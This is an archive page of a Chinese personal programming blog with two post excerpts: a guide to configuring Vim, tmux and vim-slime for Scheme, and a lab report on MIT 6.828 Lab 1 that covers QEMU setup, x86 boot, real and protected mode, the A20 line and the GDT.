
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="码龙的窝">
    <title>归档 - 码龙的窝</title>
    <meta name="author" content="CoSidian">
    
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta name="description" content="/* 0与1之风吹遍山谷 */">
<meta property="og:type" content="blog">
<meta property="og:title" content="码龙的窝">
<meta property="og:url" content="http://blog.codedragon.tech/archives/index.html">
<meta property="og:site_name" content="码龙的窝">
<meta property="og:description" content="/* 0与1之风吹遍山谷 */">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="码龙的窝">
<meta name="twitter:description" content="/* 0与1之风吹遍山谷 */">
    
    
        
    
    
        <meta property="og:image" content="http://blog.codedragon.tech/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-woaw2oiuh6ifndjd9g1rtlhfl8vkkshjspee4sufshrwj8j8vsj4o4ienv0e.min.css">
    <!--STYLES END-->
    
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-108458894-1', 'auto');
        ga('send', 'pageview');
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">码龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">CoSidian</h4>
                
                    <h5 class="sidebar-profile-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="首页"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                            title="分类"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                            title="标签"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="归档"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                            title="关于"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener" title="GitHub">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/Cosidian" target="_blank" rel="noopener" title="Telegram">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-paper-plane" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener" title="Steam">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener" title="邮箱">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/friendly-links"
                            
                            title="友情链接"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/book-recommend"
                            
                            title="图书推荐"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-book" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">图书推荐</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/12/11/Vim-Tmux配置Scheme编程环境/">
                            Vim+Tmux配置Scheme编程环境
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-12-11T22:18:25+08:00">
	
		    12月 11, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/环境配置/">环境配置</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <blockquote>
<p>最近开始阅读Structure of Interpretation of Computer Science即计算机程序的构造与解释这本书。该书中使用的是Scheme作为Lisp的方言。<br>在此之前华盛顿大学的《程序设计语言》这门课的PartB中，我使用的Lisp方言是Racket，配合DrRacket作为IDE使用。因为最近一直在配置vim，这一次打算使用vim作为主力开发环境。</p>
</blockquote>
<p>如果你对我的配置文件（vim，tmux等）感兴趣，可以看<a href="https://github.com/BlackDragonF/ConfigurationFiles" target="_blank" rel="external">这里</a>。</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>最终的效果如下图所示：<br><img src="/2017/12/11/Vim-Tmux配置Scheme编程环境/final.gif" alt="final.gif" title=""></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最初的思路来自于网上的一篇文章，作者也是正在阅读SICP这本书，其提到了使用tmux进行分屏，在一边使用vim进行代码的编辑，另一边运行mit-scheme作为REPL（Read-Eval-Print-Loop）解释scheme代码。</p>
<p>但是如果这么做的话，需要反复执行<code>mit-scheme &lt; source.scm</code>，这样做显然不能提高我们编程的效率。</p>
<p>这几天逛友链博客的时候发现刚好Kyler也在读SICP并且配置了vim环境，具体可以参考这篇<a href="http://www.theta.live/2017/12/09/Vim-for-Scheme/" target="_blank" rel="external">博客</a>。<br>受到这篇博客的启发，我决定使用vim-slime来“沟通”vim和tmux，将vim中的Scheme代码发送到运行在tmux中的解释器，并且运行给出结果。</p>
<p>在学习tmux的过程中我接触到了tmuxinator这个tmux配置管理工具。可以通过tmuxinator直接配置tmux session，十分方便。</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>这篇博客的配置依赖于：</p>
<ol>
<li>vim（文本编辑器）</li>
<li>tmux和tmuxinator（终端会话工具）</li>
<li>mit-scheme（Scheme解释器）</li>
</ol>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先在家目录下的.tmuxinator子文件夹下创建新的配置文件scheme.yml：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># tmuxinator configuration file for scheme  </span></div><div class="line"><span class="comment"># location: ~/.tmuxinator/scheme.yml</span></div><div class="line"></div><div class="line"><span class="attr">name:</span> <span class="string">scheme</span></div><div class="line"><span class="attr">root:</span> <span class="string">.</span></div><div class="line"></div><div class="line"><span class="attr">startup_window:</span> <span class="string">main</span></div><div class="line"><span class="attr">socket_name:</span> <span class="string">tmux_scheme</span></div><div class="line"></div><div class="line"><span class="attr">windows:</span></div><div class="line"><span class="attr">    - main:</span></div><div class="line"><span class="attr">        layout:</span> <span class="string">even-horizontal</span></div><div class="line"><span class="attr">        panes:</span></div><div class="line"><span class="bullet">            -</span> <span class="string">vim</span> &lt;%= @args[0] %&gt;</div><div class="line"><span class="bullet">            -</span> <span class="string">mit-scheme</span></div></pre></td></tr></table></figure><br>该配置文件指定新的scheme session拥有一个窗口main，该窗口有两个窗格，一个执行vim，另一个执行mit-scheme，并且创建的session的socket name为tmux_scheme。</p>
<p>然后我们在.vimrc中安装并配置vim-slime插件。<br>这里我直接使用插件管理器Vundle安装vim-slime：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bundle <span class="string">'jpalardy/vim-slime'</span></div></pre></td></tr></table></figure></p>
<p>然后在.vimrc中加入配置：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">" vim-slime configuration</span></div><div class="line"><span class="comment">" 设置目标为tmux</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_target</span> = <span class="string">"tmux"</span></div><div class="line"><span class="comment">" 为tmux设置默认配置，指定socket_name为tmux_scheme，目标窗格为当前窗口的第2个窗格</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_default_config</span> = &#123;<span class="string">"socket_name"</span>: <span class="string">"tmux_scheme"</span>, <span class="string">"target_pane"</span>:<span class="string">":.1"</span>&#125;</div><div class="line"><span class="comment">" 指定slime在第一次发送代码时不要询问配置</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_dont_ask_default</span> = <span class="number">1</span></div><div class="line"><span class="comment">" 指定作为缓冲区的文件（该文件默认在执行完后不会被清空或者删除）</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_paste_file</span> = <span class="string">"$HOME/.slime_paste"</span></div></pre></td></tr></table></figure></p>
<p>vim-slime的默认快捷键是<c-c> <c-c>（两次Ctrl-C）发送代码；<c-c> v（Ctrl-C + v）修改配置。</c-c></c-c></c-c></p>
<p>最后编写测试文件test.scm，执行<code>tmuxinator start scheme test.scm</code>，在vim中按下两次Ctrl-C。应该能实现和上文效果图一样的效果。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>本篇博客只是给出了大概的环境配置的思路以及一些具体的配置文件。<br>如果想要深度地定制属于自己的Scheme开发环境，你可能还需要阅读vim、vim-slime、tmux、tmuxinator的文档与网上的教程。<br>配置的方式也不仅仅局限于tmux，gnu-screen、vim-terminal等同样能作为vim-slime连接的目标。<br>配置的环境也不必仅仅局限于Scheme，python、sml等解释型语言均可使用。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/12/11/Vim-Tmux配置Scheme编程环境/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/">
                            MIT6.828操作系统工程Lab1-Booting a PC实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-12-09T03:32:48+08:00">
	
		    12月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/操作系统/">操作系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <blockquote>
<p>本学期开设了操作系统的专业课。根据老师的介绍，下个学期的操作系统课设就是MIT的6.828的Labs，再加上团队老学长/同学的推荐，打算先在这个学期完成6.828，加深对于系统的理解。<br>Lab1 - Booting a PC是比较简单的实验，主要包括了引导、内核、控制台输出、以及栈。尽管如此，由于相关知识的缺失，我断断续续做了2周（2017年10月26日）才完成该实验。<br>2017年12月9日，完成了实验的提高部分并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>首先需要完成实验环境的搭建。实验环境主要由两个部分组成：QEMU用来模拟运行内核，以及一条编译工具链用于编译和测试内核。这里我使用的系统是64位的ArchLinux。</p>
<blockquote>
<p>本部分可以参考MIT 6.828官网的<a href="https://pdos.csail.mit.edu/6.828/2017/tools.html" target="_blank" rel="external">Tools</a>。</p>
</blockquote>
<h3 id="编译工具链"><a href="#编译工具链" class="headerlink" title="编译工具链"></a>编译工具链</h3><p>编译工具链包含了C编译器、汇编器、连接器，用于从源代码生成可执行二进制文件。本实验的目标代码是32位的Intel架构（x86），可执行文件格式为ELF。</p>
<p>在Arch Linux下，若是在安装时选择了base-devel包组，则gcc应该是系统自带的编译工具链。但是，该gcc默认不能编译生成32位的可执行文件。需要我们手动开启<a href="https://wiki.archlinux.org/index.php/multilib" target="_blank" rel="external">multilib</a>并安装gcc-multilib以及相关的软件包。</p>
<h4 id="GCC版本降级说明"><a href="#GCC版本降级说明" class="headerlink" title="GCC版本降级说明"></a>GCC版本降级说明</h4><p>在我和华田的Arch下，使用gcc 7.1.1-3之后的版本编译生成的JOS kernel均无法使用。在无法查明原因的情况下，推荐将gcc降级至7.1.1-3完成6.828的实验。</p>
<p>有关于Arch下软件包降级的教程请看<a href="https://wiki.archlinux.org/index.php/downgrading_packages" target="_blank" rel="external">这里</a>。</p>
<h3 id="Qemu模拟器"><a href="#Qemu模拟器" class="headerlink" title="Qemu模拟器"></a>Qemu模拟器</h3><p>QEMU是一个现代并且快速的PC模拟器，但是为了与实验兼容，MIT推荐使用他们patched过的QEMU版本。我们按照Tools上的教程从源码编译并安装QEMU。</p>
<p>注意：提供的QEMU并不支持make uninstall，需要手动卸载QEMU。如果您于手动编译并安装可能存在的<strong>后果</strong>抱有顾虑，推荐使用包管理软件安装QEMU</p>
<h4 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h4><ol>
<li>所需要的库名可以在arch官网上通过搜索软件包的方式找到；</li>
<li>configure的时候加上–disable-werror以保证不会因出现编译警告而终止编译；</li>
<li><p>出现如下错误：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Unescaped left brace <span class="keyword">in</span> regex is illegal here <span class="keyword">in</span> regex; marked by &lt;-- HERE <span class="keyword">in</span> m/^\@strong&#123; &lt;-- HERE (.*)&#125;$/ at /home/guest/qemu/scripts/texi2pod.pl line 320.</div><div class="line"></div><div class="line">make: *** [Makefile:474：qemu.1] 错误 255。</div></pre></td></tr></table></figure>
<p> 该错误是由于perl版本更新后正则表达式语法的变动造成的，直接修改安装脚本的<code>/home/chenzhihao/qemu/scripts/texi2pod.pl line 320</code>，将<code>{</code>改成 <code>\{</code>即可；</p>
</li>
<li>configure时可能需要指定python版本为2以避免调用python3出现错误，参数为<code>--python=/usr/bin/python2.7</code>。</li>
</ol>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验1总共分为3个部分：</p>
<ul>
<li>第1部分主要关注x86汇编语言、QEMU x86模拟器以及PC的上电启动流程；</li>
<li>第2部分主要关注6.828内核的引导程序；</li>
<li>第3部分开始挖掘6.828内核的最初模板 - JOS。</li>
</ul>
<p>实验使用Git进行版本管理，我们需要从MIT的Git克隆最开始的仓库，有关这一部分的具体说明请自行参考<a href="https://pdos.csail.mit.edu/6.828/2017/labs/lab1/" target="_blank" rel="external">Lab1实验讲义</a>。</p>
<p>有关于Git的教程推荐<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="external">廖雪峰的官方博客</a>或者是<a href="https://www.gitbook.com/book/bingohuang/progit2/details" target="_blank" rel="external">Pro Git 2</a>。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-PC-Bootstrap-PC引导"><a href="#第一部分-PC-Bootstrap-PC引导" class="headerlink" title="第一部分 PC Bootstrap - PC引导"></a>第一部分 PC Bootstrap - PC引导</h3><h4 id="x86汇编"><a href="#x86汇编" class="headerlink" title="x86汇编"></a>x86汇编</h4><p>本实验需要熟悉x86汇编，8086汇编我已经在王爽的《汇编语言》中学习过，x86_64汇编我也已经在《深入理解计算机系统》中有所涉猎。本实验中使用的是i386汇编。这里不再赘述。</p>
<h4 id="模拟x86"><a href="#模拟x86" class="headerlink" title="模拟x86"></a>模拟x86</h4><p>在本实验中使用QEMU作为模拟器。尽管QEMU内置的监控只能提供少量的调试支持，但是QEMU却可以作为GNU-Debugging（GDB）的远程调试目标。</p>
<p>根据实验指导使用make编译生成内核并且用make qemu或者是make qemu-nox启动QEMU。我们可以看到，当前的内核仅支持两条命令help和kerninfo。</p>
<h4 id="PC的物理地址空间"><a href="#PC的物理地址空间" class="headerlink" title="PC的物理地址空间"></a>PC的物理地址空间</h4><p>PC的物理地址空间有着如下的布局：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</div><div class="line">|      32-bit      |</div><div class="line">|  memory mapped   |</div><div class="line">|     devices      |</div><div class="line">|                  |</div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line"></div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line">|                  |</div><div class="line">|      Unused      |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- depends on amount of RAM</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">| Extended Memory  |</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00100000 (1MB)</div><div class="line">|     BIOS ROM     |</div><div class="line">+------------------+  &lt;- 0x000F0000 (960KB)</div><div class="line">|  16-bit devices, |</div><div class="line">|  expansion ROMs  |</div><div class="line">+------------------+  &lt;- 0x000C0000 (768KB)</div><div class="line">|   VGA Display    |</div><div class="line">+------------------+  &lt;- 0x000A0000 (640KB)</div><div class="line">|                  |</div><div class="line">|    Low Memory    |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00000000</div></pre></td></tr></table></figure>
<p>最初的PC基于Intel的16位8088处理器，仅能够支持2^20B = 2^10KB = 1MB的寻址，早期的地址空间从0x00000开始到0xFFFFF结束。</p>
<ul>
<li>0x00000到0xA0000（640KB）被称作低内存，是早期PC能用的唯一的RAM；</li>
<li>0xA0000到0xFFFFF（384KB）被硬件保留作特殊用途如视频缓冲区或是固件，该部分最重要的区域是从0xF0000到0xFFFFF（64KB）的基本输入输出系统（BIOS）。BIOS用作执行最基本的系统初始化如激活显卡、检查内存等。在初始化完成后，BIOS从软盘、硬盘、光驱或是网络中读取操作系统，并且将机器控制权转移给操作系统。</li>
</ul>
<p>从Intel的80286到80386，处理器能够支持16MB和4GB的地址空间。但为了后向兼容性，硬件设计者保留了低1M内存的布局。<br>现代PC因此在0x000A0000到0x00100000的内存中有一个“洞”，这个洞将内存分为了低内存/保留内存（Low Memory）（低640KB）以及扩展内存（Extended Memory）（其他内存）。除此以外，32位PC的地址空间的最上方，常常被BIOS保留用作32位的PCI设备。</p>
<p>最新的x86处理器能够支持超过4GB的物理内存，因此内存可以超过0xFFFFFFFF。因此BIOS需要预留出第二个“洞”以保证那些32位的PCI设备的地址可以被正确的映射。</p>
<p>由于JOS只会使用256M内存，在此假设仅PC具有32位的地址空间。</p>
<h4 id="ROM-BIOS"><a href="#ROM-BIOS" class="headerlink" title="ROM BIOS"></a>ROM BIOS</h4><p>根据实验指导，进行QEMU和GDB的联合调试。我们会发现从上电开始，IBM PC从0x000ffff0开始执行指令。该处位于为BIOS预留的64kb的空间的顶层。此时CS = 0xf000 IP = 0xfff0。且第1条指令是一个jmp指令，跳转至CS = 0xf000 IP = 0xe05b。</p>
<p>这些都是早期的8088处理器的设计者设计的。这样的设计保证了BIOS总能控制机器。因为在刚上电的时候，在内存中并不存在能够执行的代码。</p>
<blockquote>
<p>此处需要理解8086的分段式寻址，即通过两个16位寄存器的值构造20位地址。实际地址为CS × 16 + IP = 0xf000 × 16 + 0xfff0 = 0xffff0。</p>
</blockquote>
<h3 id="第二部分-引导"><a href="#第二部分-引导" class="headerlink" title="第二部分 引导"></a>第二部分 引导</h3><p>软盘和硬盘被分为了512Bytes的区域 - 扇区（Sector）。一个扇区是磁盘传输的最小粒度：每一个读操作和写操作必须是一个或是一个以上的扇区，并且必须要对齐到扇区。</p>
<p>如果一个磁盘是可引导的，那么它的第一个扇区就被称作引导扇区，引导代码就存储在引导扇区中。如果BIOS发现了一个可引导的硬件，那么它就将这个扇区从磁盘读取至内存的0x7c00到0x7dff处，并且使用一个jmp指令设置CS：IP = 0000:7C00，将控制传递给引导。和BIOS读取地址一样，这个地址对于PC来说是固定和标准化的。</p>
<blockquote>
<p>从光盘引导的情形更加复杂，因为光盘的一个扇区为2048Byte，BIOS可以从硬盘读取一个更大的引导镜像到内存中。</p>
</blockquote>
<p>在6.828中，使用硬盘的传统引导机制。这意味这引导必须满足512个Bytes的限制。引导由一个汇编文件boot/boot.S，以及一个C语言文件boot/main.c组成。</p>
<hr>
<p>为了理解boot.S，需要以下的知识储备。</p>
<h4 id="实模式和保护模式"><a href="#实模式和保护模式" class="headerlink" title="实模式和保护模式"></a>实模式和保护模式</h4><h5 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h5><p>实模式是为了与8086兼容而设置的。在实模式下，处理器相当于一个快速的8086处理器。当处理器被加电或者复位时以实模式启动。</p>
<ul>
<li>实模式下各寄存器以实模式的初始化值工作；</li>
<li>实模式的地址空间总共为20位（1MB）；</li>
<li>实模式下不支持内存分页机制；</li>
<li>实模式下各内存段均是可读、可写、可执行的，不支持指令优先级，所有的指令均运行在特权级；</li>
<li>实模式不支持多任务切换；</li>
<li>实模式的中断处理也和8086相同，使用中断向量表来定位中断服务程序。</li>
</ul>
<p>在保护模式下，处理器的所有功能都是可用的。具体来说：</p>
<ul>
<li>保护模式提供了完全的32位地址空间，寻址空间为4GB；</li>
<li>保护模式支持内存分页机制，提供了对虚拟内存的硬件支持；</li>
<li>保护模式的处理器支持多任务（上下文切换）；</li>
<li>保护模式的处理器支持指令和数据的特权级，配合边界检查等机制，既可以共享数据也可以隔离各个任务。</li>
</ul>
<p>为了保证后向兼容性，x86的处理器启动时默认是实模式，需要手动从实模式切换至保护模式。但是切换至保护模式之前需要做一些必要的准备工作，如打开A20和建立全局描述符表等。</p>
<h4 id="A20地址线"><a href="#A20地址线" class="headerlink" title="A20地址线"></a>A20地址线</h4><p>在早期的PC上处理器仅支持20位的地址空间，任何超过20位的地址都会被卷回。<br>例如：0xFFFF+0xFFFF = 0x1FFFE -&gt; 0xFFFE</p>
<p>然而，从80286开始，Intel支持了24位的地址空间，上例的地址相加将不会发生卷回。<br>为了保证与早期PC的完全兼容，Intel采用了“黑魔法” - 将A20（第21根）地址线与键盘控制器的一个输出进行了与运算。进而控制A20地址线的值。</p>
<p>默认情况下，A20是置0的，PC将只能访问1M、3M、5M…这样的奇数段。进入保护模式前我们需要先打开A20以获得完全的寻址能力。</p>
<p>JOS内核通过端口的方式与键盘控制器进行通信并打开A20。可以参考Reference中的<a href="http://www.computer-engineering.org/ps2keyboard/" target="_blank" rel="external">PS/2 Keyboard Interface</a>。</p>
<ul>
<li>8042有一个1 Byte的输入缓冲区，一个1 Byte的输出缓冲区、一个1 Byte的状态寄存器、以及一个1 Byte的控制寄存器。前三个寄存器可以直接从0x60和0x64端口进行访问。最后一个寄存器通过“Read Command Byte”命令进行读，通过“Write Command Byte”命令进行写。</li>
<li>对0x60端口读会读输入缓冲区；对0x60端口写会写输出缓冲区；对0x64端口读会读状态寄存器；对0x64端口写会发送命令。</li>
<li>状态寄存器的Bit1为IBF - Input Buffer Full，当该Bit为1时，输入缓冲区满，不能对0x60端口或0x64端口写。</li>
<li>对0x64端口写0xd1发送的命令是“Write Output Port”写输出端口，表明将参数写入输出端口（0x60端口写）。</li>
<li>A20使用的是键盘控制器输出的Bit 1，向输出端口写入0xdf可以打开A20；向输出端口写入0xdd则会关闭A20。</li>
</ul>
<h4 id="分段机制与全局描述符表"><a href="#分段机制与全局描述符表" class="headerlink" title="分段机制与全局描述符表"></a>分段机制与全局描述符表</h4><p>x86处理器提供了分段机制和分页机制两种内存管理模式。如果要进入保护模式，就必须要先启动分段机制。（分页机制不是必须的）</p>
<p>分段机制将内存划分为若干个段，每个段都由段基址、段界限和段属性组成。由一个段描述符表（可以理解为一个数组）描述所有段的信息。段描述符表可以是全局的也可以是局部的。</p>
<p>简化的说，程序首先将对应的段选择子（可以理解为数组的索引）加载进入段寄存器中。然后在执行程序时，根据指令的内容确定应该使用的段寄存器，根据段寄存器中的段选择子确定应该使用的段描述符。再结合段描述符中包含的信息加上指令自身的地址构造出实际的物理地址。最终将该地址发送到地址总线上，到物理内存中寻址，并取回相应的数据。这之中我们简化了有关特权级、边界检查的相关内容，但足以描述分段机制的基本原理。</p>
<p>分段机制将虚拟地址转换成了线性地址。</p>
<h5 id="全局描述符表寄存器"><a href="#全局描述符表寄存器" class="headerlink" title="全局描述符表寄存器"></a>全局描述符表寄存器</h5><p>x86处理器提供了专门的全局描述符表寄存器（Global Descriptor Table Register）用于保存全局描述符表的表基址和表限长。GDTR由2个字节的表限长（limit）和4个字节的表基址（base）组成。其中表基址指定了全局描述符表的起始地址，表限长指定了全局描述符表的大小。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtr</span> &#123;</span></div><div class="line">	u16 limite;</div><div class="line">	u32 base;</div><div class="line">&#125; __attribute__ ((packed));</div></pre></td></tr></table></figure></p>
<p>在机器刚加电或者是处理器复位后，表基址默认被置为0，表限长则默认被置为0xFFFF。在保护模式初始化的过程中，必须给GDTR加载新的值。我们可以使用lgdt指令为GDTR加载新值。</p>
<h5 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h5><p>段选择子（2个字节）用于选择特定的描述符表以及表中的特定描述符。段选择子一般被放置于段寄存器中，段选择子由13位的索引、1位的表指示位和2位的请求特权级三部分组成。其中索引指定了描述符，表指示位选择应该访问的描述符表 - 0代表全局描述符表，1代表局部描述符表，请求特权级用于段级的保护机制，自0到4分别代表ring 0到ring 3。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selector</span> &#123;</span></div><div class="line">    u16 index:<span class="number">13</span>;</div><div class="line">    u16 ti:<span class="number">1</span>;</div><div class="line">    u16 rpl:<span class="number">2</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
